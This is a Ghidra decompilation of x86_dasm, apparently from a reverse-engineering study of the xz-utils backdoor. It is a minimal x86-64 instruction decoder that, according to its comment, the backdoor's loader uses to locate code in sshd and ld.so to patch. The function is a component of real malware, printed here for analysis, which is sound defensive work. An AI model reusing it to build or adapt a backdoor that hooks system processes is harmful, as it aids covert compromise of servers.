// /home/kali/xzre-ghidra/xzregh/100020_x86_dasm.c
// Function: x86_dasm @ 0x100020
// Calling convention: __stdcall
// Prototype: BOOL __stdcall x86_dasm(dasm_ctx_t * ctx, u8 * code_start, u8 * code_end)


/*
 * AutoDoc: Implements a minimal x86-64 decoder that walks a buffer while tracking instruction metadata. Every search helper in the loader uses it to reason about sshd and ld.so machine code without linking a full disassembler, giving the backdoor reliable patch coordinates at runtime.
 */
#include "xzre_types.h"


BOOL x86_dasm(dasm_ctx_t *ctx,u8 *code_start,u8 *code_end)

{
  _union_80 *p_Var1;
  u8 *puVar2;
  byte bVar3;
  byte bVar4;
  int iVar5;
  ushort uVar6;
  byte bVar7;
  BOOL BVar8;
  int iVar9;
  u64 uVar10;
  sbyte sVar11;
  uint uVar12;
  uint uVar13;
  long lVar14;
  byte *pbVar15;
  byte *pbVar16;
  byte bVar17;
  uint uVar18;
  ulong uVar19;
  ulong uVar20;
  byte *pbVar21;
  dasm_ctx_t *pdVar22;
  ulong uVar23;
  _union_78 *p_Var24;
  BOOL has_bytes_remaining;
  BOOL is_two_byte_opcode;
  byte bVar27;
  ulong local_38 [4];
  
  bVar27 = 0;
  BVar8 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x12,0x46,2);
  if (BVar8 == FALSE) {
    return FALSE;
  }
  pdVar22 = ctx;
  for (lVar14 = 0x16; lVar14 != 0; lVar14 = lVar14 + -1) {
    *(undefined4 *)&pdVar22->instruction = 0;
    pdVar22 = (dasm_ctx_t *)((long)pdVar22 + (ulong)bVar27 * -8 + 4);
  }
  has_bytes_remaining = code_start < code_end;
  pbVar15 = code_start;
  do {
    if (!has_bytes_remaining) {
LAB_00100aa5:
      for (lVar14 = 0x16; lVar14 != 0; lVar14 = lVar14 + -1) {
        *(undefined4 *)&ctx->instruction = 0;
        ctx = (dasm_ctx_t *)((long)ctx + (ulong)bVar27 * -8 + 4);
      }
      return FALSE;
    }
    bVar17 = *pbVar15;
    uVar12 = (uint)bVar17;
    if (bVar17 < 0x68) {
      if (bVar17 < 0x2e) {
        if (bVar17 == 0xf) {
          ctx->_unknown810[0] = '\x0f';
          ctx->_unknown810[1] = '\0';
          ctx->_unknown810[2] = '\0';
          ctx->field_0x2b = 0;
          pbVar15 = pbVar15 + 1;
LAB_001001c9:
          if (code_end <= pbVar15) goto LAB_00100aa5;
          iVar9._0_1_ = ctx->_unknown810[0];
          iVar9._1_1_ = ctx->_unknown810[1];
          iVar9._2_1_ = ctx->_unknown810[2];
          iVar9._3_1_ = ctx->field_0x2b;
          uVar12 = iVar9 << 8;
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          bVar17 = *pbVar15;
          uVar12 = bVar17 | uVar12;
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          bVar7 = *pbVar15;
          if ((bVar7 & 0xfd) == 0x38) {
            if (((ctx->field2_0x10).field0.flags & 0x10) != 0) {
              return FALSE;
            }
            pbVar15 = pbVar15 + 1;
            goto LAB_001003fa;
          }
          if (((int)(uint)(byte)(&DAT_0010ad40)[bVar7 >> 3] >> (bVar7 & 7) & 1U) == 0) {
            return FALSE;
          }
          if (((ctx->field2_0x10).field0.lock_rep_byte == 0xf3) && (bVar7 == 0x1e)) {
            if (pbVar15 + 1 < code_end) {
              p_Var24 = &ctx->field2_0x10;
              for (lVar14 = 0x12; lVar14 != 0; lVar14 = lVar14 + -1) {
                *(undefined4 *)p_Var24 = 0;
                p_Var24 = (_union_78 *)((long)p_Var24 + (ulong)bVar27 * -8 + 4);
              }
              ctx->instruction = code_start;
              ctx->instruction_size = 4;
              iVar9 = (pbVar15[1] == 0xfa) + 0xa5fc + (uint)(pbVar15[1] == 0xfa);
LAB_001004f1:
              ctx->_unknown810[0] = (char)iVar9;
              ctx->_unknown810[1] = (char)((uint)iVar9 >> 8);
              ctx->_unknown810[2] = (char)((uint)iVar9 >> 0x10);
              ctx->field_0x2b = (char)((uint)iVar9 >> 0x18);
              return TRUE;
            }
            goto LAB_00100aa5;
          }
          *(char *)&ctx->operand_size = (char)((long)pbVar15 - (long)code_start);
          uVar18 = uVar12;
          if (((ctx->field2_0x10).field0.flags & 0x10) != 0) {
            uVar18 = (uint)bVar17;
          }
          if ((uVar18 & 0xf0) == 0x80) {
            uVar10 = 4;
LAB_001004a7:
            puVar2 = &(ctx->field2_0x10).field0.flags2;
            *puVar2 = *puVar2 | 8;
            ctx->operand_zeroextended = uVar10;
          }
          else {
            if ((byte)uVar18 < 0x74) {
              if (0x6f < (uVar18 & 0xff)) {
LAB_001004a2:
                uVar10 = 1;
                goto LAB_001004a7;
              }
            }
            else {
              uVar13 = (uVar18 & 0xff) - 0xa4;
              if ((uVar13 < 0x23) && ((0x740400101U >> ((byte)uVar13 & 0x3f) & 1) != 0))
              goto LAB_001004a2;
            }
            ctx->operand_zeroextended = 0;
          }
          pbVar16 = pbVar15;
          if (((byte)(&DAT_0010ad20)[uVar18 >> 3 & 0x1f] >> (uVar18 & 7) & 1) == 0) {
            if (((ctx->field2_0x10).field0.flags2 & 8) != 0) goto LAB_0010067d;
            ctx->instruction = code_start;
            pbVar15 = (byte *)(((long)pbVar15 - (long)code_start) + 1);
          }
          else {
LAB_001008c5:
            pbVar15 = pbVar16 + 1;
            if (code_end <= pbVar15) goto LAB_00100aa5;
            bVar17 = (ctx->field2_0x10).field0.flags;
            (ctx->field2_0x10).field0.flags = bVar17 | 0x40;
            bVar7 = *pbVar15;
            *(byte *)((long)&ctx->field2_0x10 + 0xc) = bVar7;
            bVar7 = bVar7 >> 6;
            *(byte *)((long)&ctx->field2_0x10 + 0xd) = bVar7;
            bVar3 = *pbVar15;
            *(byte *)((long)&ctx->field2_0x10 + 0xe) = (byte)((int)(uint)bVar3 >> 3) & 7;
            bVar4 = *pbVar15;
            *(byte *)((long)&ctx->field2_0x10 + 0xf) = bVar4 & 7;
            if (bVar7 == 3) {
LAB_00100902:
              if (((ctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000) {
LAB_0010092e:
                puVar2 = &(ctx->field2_0x10).field0.flags2;
                *puVar2 = *puVar2 | 1;
              }
            }
            else {
              if ((bVar4 & 7) == 4) {
                (ctx->field2_0x10).field0.flags = bVar17 | 0xc0;
              }
              if (bVar7 != 1) {
                if (bVar7 != 2) goto LAB_00100902;
                goto LAB_0010092e;
              }
              puVar2 = &(ctx->field2_0x10).field0.flags2;
              *puVar2 = *puVar2 | 3;
            }
            uVar12 = *(uint *)ctx->_unknown810;
            if ((uVar12 - 0xf6 < 2) && (((int)(uint)bVar3 >> 3 & 7U) != 0)) {
              puVar2 = &(ctx->field2_0x10).field0.flags2;
              *puVar2 = *puVar2 & 0xf7;
              ctx->operand_zeroextended = 0;
            }
            if ((char)(ctx->field2_0x10).field0.flags < '\0') {
              if (code_end <= pbVar16 + 2) goto LAB_00100aa5;
              bVar17 = pbVar16[2];
              ctx->field_0x21 = bVar17;
              ctx->field_0x22 = bVar17 >> 6;
              ctx->field_0x23 = (byte)((int)(uint)pbVar16[2] >> 3) & 7;
              bVar17 = pbVar16[2];
              (ctx->field4_0x24).field0_0x0.field0.sib = bVar17 & 7;
              if ((bVar17 & 7) == 5) {
                bVar17 = *(byte *)((long)&ctx->field2_0x10 + 0xd);
                if ((bVar17 & 0xfd) == 0) {
                  puVar2 = &(ctx->field2_0x10).field0.flags2;
                  *puVar2 = *puVar2 | 1;
                }
                else if (bVar17 == 1) {
                  puVar2 = &(ctx->field2_0x10).field0.flags2;
                  *puVar2 = *puVar2 | 3;
                }
              }
              bVar17 = (ctx->field2_0x10).field0.flags2;
              if ((bVar17 & 2) == 0) {
                if ((bVar17 & 1) != 0) {
                  pbVar16 = pbVar16 + 3;
                  goto LAB_0010073c;
                }
                if ((bVar17 & 8) != 0) {
                  pbVar15 = pbVar16 + 3;
                  goto LAB_00100680;
                }
                ctx->instruction = code_start;
                pbVar15 = pbVar16 + 2 + (1 - (long)code_start);
                goto LAB_001004e1;
              }
              pbVar15 = pbVar16 + 3;
LAB_001009ea:
              if (code_end <= pbVar15) goto LAB_00100aa5;
              lVar14 = (long)(char)*pbVar15;
              bVar17 = (ctx->field2_0x10).field0.flags2;
              ctx->_unknown812[0] = (char)lVar14;
              ctx->_unknown812[1] = (char)((ulong)lVar14 >> 8);
              ctx->_unknown812[2] = (char)((ulong)lVar14 >> 0x10);
              ctx->_unknown812[3] = (char)((ulong)lVar14 >> 0x18);
              *(int *)&ctx->field_0x34 = (int)((ulong)lVar14 >> 0x20);
            }
            else {
              bVar17 = (ctx->field2_0x10).field0.flags2;
              if ((bVar17 & 2) != 0) {
                pbVar15 = pbVar16 + 2;
                goto LAB_001009ea;
              }
              if ((bVar17 & 1) != 0) goto LAB_0010065f;
            }
            if ((bVar17 & 8) != 0) goto LAB_0010067d;
            ctx->instruction = code_start;
            pbVar15 = pbVar15 + (1 - (long)code_start);
          }
LAB_001004e1:
          ctx->instruction_size = (u64)pbVar15;
          if (pbVar15 == (byte *)0x0) {
            return FALSE;
          }
          goto LAB_001004ee;
        }
        if (bVar17 != 0x26) goto LAB_00100191;
      }
      else if ((0xc0000000010101U >> ((ulong)(bVar17 - 0x2e) & 0x3f) & 1) == 0) {
        if (bVar17 == 0x67) {
          bVar17 = (ctx->field2_0x10).field0.flags;
          if ((bVar17 & 8) != 0) {
            return FALSE;
          }
          (ctx->field2_0x10).field0.flags = bVar17 | 8;
          (ctx->field2_0x10).field0.asize_byte = *pbVar15;
        }
        else {
          if (bVar17 != 0x66) {
            if ((bVar17 & 0xf0) == 0x40) {
              (ctx->field2_0x10).field0.flags = (ctx->field2_0x10).field0.flags | 0x20;
              bVar17 = *pbVar15;
              pbVar15 = pbVar15 + 1;
              (ctx->field2_0x10).field0.field10_0xb.rex_byte = bVar17;
            }
            goto LAB_00100191;
          }
          bVar17 = (ctx->field2_0x10).field0.flags;
          if (((bVar17 & 4) != 0) && ((ctx->field2_0x10).field0.osize_byte != 'f')) {
            return FALSE;
          }
          if ((bVar17 & 0x20) == 0) {
            (ctx->field2_0x10).field0.flags = (ctx->field2_0x10).field0.flags | 4;
            (ctx->field2_0x10).field0.osize_byte = *pbVar15;
          }
        }
        goto LAB_00100675;
      }
      bVar17 = (ctx->field2_0x10).field0.flags;
      if ((bVar17 & 2) != 0) {
        return FALSE;
      }
      (ctx->field2_0x10).field0.flags = bVar17 | 2;
      (ctx->field2_0x10).field0.seg_byte = *pbVar15;
    }
    else {
      if (bVar17 != 0xf0) {
        if (bVar17 < 0xf1) {
          if (1 < (byte)(bVar17 + 0x3c)) goto LAB_00100191;
          bVar7 = (ctx->field2_0x10).field0.flags;
          if ((bVar7 & 0x20) != 0) {
            return FALSE;
          }
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          bVar3 = *pbVar15;
          pbVar16 = pbVar15 + 1;
          (ctx->field2_0x10).field0.flags = bVar7 | 0x10;
          (ctx->field2_0x10).field0.vex_byte = bVar3;
          if (code_end <= pbVar16) goto LAB_00100aa5;
          bVar7 = pbVar15[1];
          (ctx->field2_0x10).field0.field10_0xb.rex_byte = '@';
          uVar12 = (uint)bVar17 << 8 | 0xf;
          (ctx->field2_0x10).field0.vex_byte2 = bVar7;
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          bVar17 = ((char)pbVar15[1] >> 7 & 0xfcU) + 0x44;
          *(byte *)((long)&ctx->field2_0x10 + 0xb) = bVar17;
          if (bVar3 == 0xc5) goto LAB_001001c5;
          if (bVar3 != 0xc4) {
            return FALSE;
          }
          bVar3 = pbVar15[1];
          if ((bVar3 & 0x40) == 0) {
            (ctx->field2_0x10).field0.field10_0xb.rex_byte = bVar17 | 2;
          }
          if ((pbVar15[1] & 0x20) == 0) {
            p_Var1 = &(ctx->field2_0x10).field0.field10_0xb;
            p_Var1->rex_byte = p_Var1->rex_byte | 1;
          }
          if (2 < (byte)((bVar3 & 0x1f) - 1)) {
            return FALSE;
          }
          if (code_end <= pbVar15 + 2) goto LAB_00100aa5;
          bVar17 = pbVar15[2];
          bVar7 = bVar7 & 0x1f;
          (ctx->field2_0x10).field0.vex_byte3 = bVar17;
          if (-1 < (char)bVar17) {
            p_Var1 = &(ctx->field2_0x10).field0.field10_0xb;
            p_Var1->rex_byte = p_Var1->rex_byte | 8;
          }
          uVar12 = uVar12 << 8;
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          if (bVar7 == 2) {
            uVar12 = uVar12 | 0x38;
          }
          else {
            if (bVar7 != 3) {
              if (bVar7 != 1) {
                return FALSE;
              }
              pbVar15 = pbVar15 + 3;
              goto LAB_001001c9;
            }
            uVar12 = uVar12 | 0x3a;
          }
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          pbVar15 = pbVar15 + 3;
LAB_001003fa:
          if (code_end <= pbVar15) goto LAB_00100aa5;
          iVar5._0_1_ = ctx->_unknown810[0];
          iVar5._1_1_ = ctx->_unknown810[1];
          iVar5._2_1_ = ctx->_unknown810[2];
          iVar5._3_1_ = ctx->field_0x2b;
          uVar13 = iVar5 << 8;
          ctx->_unknown810[0] = (char)uVar13;
          ctx->_unknown810[1] = (char)(uVar13 >> 8);
          ctx->_unknown810[2] = (char)(uVar13 >> 0x10);
          ctx->field_0x2b = (char)(uVar13 >> 0x18);
          bVar17 = *pbVar15;
          uVar12 = bVar17 | uVar13;
          ctx->_unknown810[0] = (char)uVar12;
          ctx->_unknown810[1] = (char)(uVar12 >> 8);
          ctx->_unknown810[2] = (char)(uVar12 >> 0x10);
          ctx->field_0x2b = (char)(uVar12 >> 0x18);
          uVar18 = uVar12;
          if (((ctx->field2_0x10).field0.flags & 0x10) != 0) {
            uVar18 = (uint)bVar17 | uVar13 & 0xffffff;
          }
          uVar13 = uVar18 & 0xff00;
          pbVar16 = pbVar15;
          if (uVar13 != 0x3800) {
            uVar12 = uVar18 & 0xff;
            bVar17 = (byte)uVar18;
            if (bVar17 < 0xf1) {
              if (uVar12 < 0xcc) {
                if (uVar12 < 0x3a) {
                  if (0x37 < uVar12) goto LAB_001005bf;
                  has_bytes_remaining = uVar12 - 0x20 < 2;
                  is_two_byte_opcode = uVar12 - 0x20 == 2;
                }
                else {
                  has_bytes_remaining = uVar12 - 0x60 < 3;
                  is_two_byte_opcode = uVar12 - 0x60 == 3;
                }
                if (!has_bytes_remaining && !is_two_byte_opcode) goto LAB_001005d6;
              }
              else if ((0x1000080001U >> (bVar17 + 0x34 & 0x3f) & 1) == 0) goto LAB_001005d6;
LAB_001005bf:
              *(char *)&ctx->operand_size = (char)pbVar15 - (char)code_start;
              if (uVar13 == 0x3a00) {
LAB_0010063c:
                puVar2 = &(ctx->field2_0x10).field0.flags2;
                *puVar2 = *puVar2 | 8;
                ctx->operand_zeroextended = 1;
                goto LAB_001008c5;
              }
            }
            else {
LAB_001005d6:
              bVar7 = bVar17 & 0xf;
              if (bVar17 >> 4 == 1) {
                if (bVar7 < 10) {
                  has_bytes_remaining = (uVar18 & 0xc) == 0;
                  goto LAB_00100604;
                }
                if (bVar7 != 0xd) {
                  return FALSE;
                }
              }
              else {
                if (bVar17 >> 4 == 4) {
                  has_bytes_remaining = (0x1c57UL >> bVar7 & 1) == 0;
                }
                else {
                  if (bVar17 >> 4 != 0) {
                    return FALSE;
                  }
                  has_bytes_remaining = (bVar17 & 0xb) == 3;
                }
LAB_00100604:
                if (has_bytes_remaining) {
                  return FALSE;
                }
              }
              *(char *)&ctx->operand_size = (char)pbVar15 - (char)code_start;
              if ((uVar13 == 0x3a00) && (2 < uVar12 - 0x4a)) goto LAB_0010063c;
            }
            ctx->operand_zeroextended = 0;
            goto LAB_001008c5;
          }
          uVar13 = uVar18 >> 3 & 0x1f;
          if (((byte)(&DAT_0010ad00)[uVar13] >> (uVar18 & 7) & 1) == 0) {
            return FALSE;
          }
          ctx->operand_zeroextended = 0;
          bVar17 = (&DAT_0010ace0)[uVar13];
          *(char *)&ctx->operand_size = (char)((long)pbVar15 - (long)code_start);
          if ((bVar17 >> (uVar18 & 7) & 1) != 0) goto LAB_001008c5;
          if (((ctx->field2_0x10).field0.flags2 & 8) == 0) {
            ctx->instruction = code_start;
            pbVar15 = (byte *)(((long)pbVar15 - (long)code_start) + 1);
            goto LAB_001004e1;
          }
LAB_0010067d:
          pbVar15 = pbVar15 + 1;
LAB_00100680:
          if (code_end <= pbVar15) goto LAB_00100aa5;
          uVar10 = ctx->operand_zeroextended;
          bVar17 = *pbVar15;
          if (uVar10 != 1) {
            pbVar16 = pbVar15 + 1;
            if (((undefined1  [16])ctx->field2_0x10 & (undefined1  [16])0xff000000000004) ==
                (undefined1  [16])0x66000000000004) {
              if (uVar10 == 2) {
                ctx->operand_zeroextended = 4;
              }
              else if (uVar10 == 4) {
                ctx->operand_zeroextended = 2;
              }
            }
            if (code_end <= pbVar16) goto LAB_00100aa5;
            uVar6 = CONCAT11(*pbVar16,bVar17);
            if (ctx->operand_zeroextended == 2) {
              ctx->operand = (ulong)uVar6;
              ctx->mem_disp = (long)(short)uVar6;
              pbVar15 = pbVar16 + (1 - (long)code_start);
              ctx->instruction = code_start;
              goto LAB_001007e4;
            }
            if (code_end <= pbVar15 + 2) goto LAB_00100aa5;
            pbVar21 = pbVar15 + 3;
            if (code_end <= pbVar21) goto LAB_00100aa5;
            uVar12 = CONCAT13(pbVar15[3],CONCAT12(pbVar15[2],uVar6));
            if (ctx->operand_zeroextended == 4) {
              ctx->operand = (ulong)uVar12;
              uVar10 = (u64)(int)uVar12;
            }
            else {
              if (((code_end <= pbVar15 + 4) || (code_end <= pbVar15 + 5)) ||
                 (code_end <= pbVar15 + 6)) goto LAB_00100aa5;
              pbVar21 = pbVar15 + 7;
              if (code_end <= pbVar21) goto LAB_00100aa5;
              uVar10 = CONCAT17(pbVar15[7],
                                CONCAT16(pbVar15[6],CONCAT15(pbVar15[5],CONCAT14(pbVar15[4],uVar12))
                                        ));
              ctx->operand = uVar10;
            }
            ctx->mem_disp = uVar10;
            goto LAB_0010089f;
          }
          ctx->operand = (ulong)bVar17;
          pbVar15 = pbVar15 + (1 - (long)code_start);
          ctx->mem_disp = (long)(char)bVar17;
          ctx->instruction = code_start;
          ctx->instruction_size = (u64)pbVar15;
        }
        else {
          if ((byte)(bVar17 + 0xe) < 2) goto LAB_001000cf;
LAB_00100191:
          if (code_end <= pbVar15) goto LAB_00100aa5;
          bVar17 = *pbVar15;
          uVar23 = (ulong)bVar17;
          if (bVar17 == 0xf) {
            ctx->_unknown810[0] = '\x0f';
            ctx->_unknown810[1] = '\0';
            ctx->_unknown810[2] = '\0';
            ctx->field_0x2b = 0;
            pbVar16 = pbVar15;
LAB_001001c5:
            pbVar15 = pbVar16 + 1;
            goto LAB_001001c9;
          }
          uVar12 = (uint)bVar17;
          uVar18 = (uint)bVar17;
          uVar13 = bVar17 & 7;
          if (((byte)(&DAT_0010ad80)[bVar17 >> 3] >> uVar13 & 1) != 0) {
            return FALSE;
          }
          ctx->_unknown810[0] = (char)uVar18;
          ctx->_unknown810[1] = (char)(uVar18 >> 8);
          ctx->_unknown810[2] = (char)(uVar18 >> 0x10);
          ctx->field_0x2b = (char)(uVar18 >> 0x18);
          local_38[0] = 0x3030303030303030;
          *(char *)&ctx->operand_size = (char)((long)pbVar15 - (long)code_start);
          local_38[1] = 0xffff0fc000000000;
          local_38[2] = 0xffff03000000000b;
          local_38[3] = 0xc00bff000025c7;
          uVar19 = local_38[bVar17 >> 6] >> (bVar17 & 0x3f);
          uVar20 = (ulong)((uint)uVar19 & 1);
          if ((uVar19 & 1) == 0) {
            ctx->operand_zeroextended = 0;
          }
          else {
            if (bVar17 < 0xf8) {
              if (bVar17 < 0xc2) {
                if (bVar17 < 0x6a) {
                  if (bVar17 < 0x2d) {
                    if (0x20 < (byte)(bVar17 - 5)) goto LAB_00100344;
                    uVar19 = 0x2020202020;
                  }
                  else {
                    uVar19 = 0x1800000000010101;
                    uVar23 = (ulong)(bVar17 - 0x2d);
                  }
                }
                else {
                  uVar19 = 0x7f80010000000001;
                  uVar23 = (ulong)(bVar17 + 0x7f);
                  if (0x3e < (byte)(bVar17 + 0x7f)) goto LAB_00100344;
                }
                if ((uVar19 >> (uVar23 & 0x3f) & 1) != 0) {
                  uVar20 = 4;
                }
              }
              else {
                uVar23 = 1L << (bVar17 + 0x3e & 0x3f);
                if ((uVar23 & 0x2000c800000020) == 0) {
                  if ((uVar23 & 0x101) != 0) {
                    uVar20 = 2;
                  }
                }
                else {
                  uVar20 = 4;
                }
              }
            }
LAB_00100344:
            puVar2 = &(ctx->field2_0x10).field0.flags2;
            *puVar2 = *puVar2 | 8;
            ctx->operand_zeroextended = uVar20;
          }
          sVar11 = (sbyte)uVar13;
          pbVar16 = pbVar15;
          if (((int)(uint)(byte)(&DAT_0010ad60)[bVar17 >> 3] >> sVar11 & 1U) != 0)
          goto LAB_001008c5;
          if (3 < bVar17 - 0xa0) {
            bVar7 = (ctx->field2_0x10).field0.flags2;
            if ((bVar7 & 8) != 0) {
              if (((((ctx->field2_0x10).field0.flags & 0x20) != 0) &&
                  (((ctx->field2_0x10).field0.field10_0xb.rex_byte & 8) != 0)) &&
                 ((bVar17 & 0xf8) == 0xb8)) {
                ctx->operand_zeroextended = 8;
                (ctx->field2_0x10).field0.flags2 = bVar7 | 0x10;
                ctx->imm64_reg = sVar11;
                ctx->_unknown810[0] = 0xb8;
                ctx->_unknown810[1] = '\0';
                ctx->_unknown810[2] = '\0';
                ctx->field_0x2b = 0;
              }
              goto LAB_0010067d;
            }
            ctx->instruction = code_start;
            pbVar15 = (byte *)(((long)pbVar15 - (long)code_start) + 1);
            goto LAB_001004e1;
          }
          puVar2 = &(ctx->field2_0x10).field0.flags2;
          *puVar2 = *puVar2 | 5;
LAB_0010065f:
          pbVar16 = pbVar15 + 1;
LAB_0010073c:
          if (((code_end <= pbVar16) || (code_end <= pbVar16 + 1)) || (code_end <= pbVar16 + 2))
          goto LAB_00100aa5;
          pbVar21 = pbVar16 + 3;
          if (code_end <= pbVar21) goto LAB_00100aa5;
          bVar17 = (ctx->field2_0x10).field0.flags2;
          lVar14 = (long)CONCAT13(pbVar16[3],CONCAT12(pbVar16[2],CONCAT11(pbVar16[1],*pbVar16)));
          ctx->_unknown812[0] = (char)lVar14;
          ctx->_unknown812[1] = (char)((ulong)lVar14 >> 8);
          ctx->_unknown812[2] = (char)((ulong)lVar14 >> 0x10);
          ctx->_unknown812[3] = (char)((ulong)lVar14 >> 0x18);
          *(int *)&ctx->field_0x34 = (int)((ulong)lVar14 >> 0x20);
          if ((bVar17 & 4) == 0) {
            if ((bVar17 & 8) != 0) {
              pbVar15 = pbVar16 + 4;
              goto LAB_00100680;
            }
LAB_0010089f:
            ctx->instruction = code_start;
            pbVar15 = pbVar21 + (1 - (long)code_start);
          }
          else {
            if (((code_end <= pbVar16 + 4) || (code_end <= pbVar16 + 5)) ||
               ((code_end <= pbVar16 + 6 || (code_end <= pbVar16 + 7)))) goto LAB_00100aa5;
            if ((bVar17 & 8) != 0) {
              pbVar15 = pbVar16 + 8;
              goto LAB_00100680;
            }
            ctx->instruction = code_start;
            pbVar15 = pbVar16 + 7 + (1 - (long)code_start);
          }
LAB_001007e4:
          ctx->instruction_size = (u64)pbVar15;
        }
        if (pbVar15 == (byte *)0x0) {
          return FALSE;
        }
        uVar12._0_1_ = ctx->_unknown810[0];
        uVar12._1_1_ = ctx->_unknown810[1];
        uVar12._2_1_ = ctx->_unknown810[2];
        uVar12._3_1_ = ctx->field_0x2b;
LAB_001004ee:
        iVar9 = uVar12 + 0x80;
        goto LAB_001004f1;
      }
LAB_001000cf:
      bVar17 = (ctx->field2_0x10).field0.flags;
      if ((bVar17 & 1) != 0) {
        return FALSE;
      }
      (ctx->field2_0x10).field0.flags = bVar17 | 1;
      (ctx->field2_0x10).field0.lock_rep_byte = *pbVar15;
    }
LAB_00100675:
    pbVar15 = pbVar15 + 1;
    has_bytes_remaining = pbVar15 < code_end;
  } while( TRUE );
}

